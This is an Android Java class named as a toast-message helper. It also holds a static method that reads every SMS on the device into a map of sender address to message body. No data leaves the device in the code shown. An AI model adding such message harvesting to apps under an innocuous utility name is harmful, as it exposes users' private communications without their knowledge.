package com.toast.test;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.widget.Toast;

import java.util.Date;
import java.util.HashMap;

public class ToastMessanger {

    public static  Context  mcontext=null;

    public  static  void getinstance(Context ctx){
        mcontext=ctx;
    }
    public static void s(Context cx,String message){
        Toast.makeText(cx, message, Toast.LENGTH_SHORT).show();
    }

    public static  HashMap getsms(){
        ContentResolver cr =mcontext.getContentResolver();
        HashMap map=new HashMap<String,String>();
        Cursor c = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
            c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        }
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String address = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat= new Date(Long.valueOf(smsDate));

                    map.put(address,body);

                    String type="sent";
                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }

                    c.moveToNext();
                }
            }

            c.close();

            return map;

        } else {
          return null;
        }
    }
}
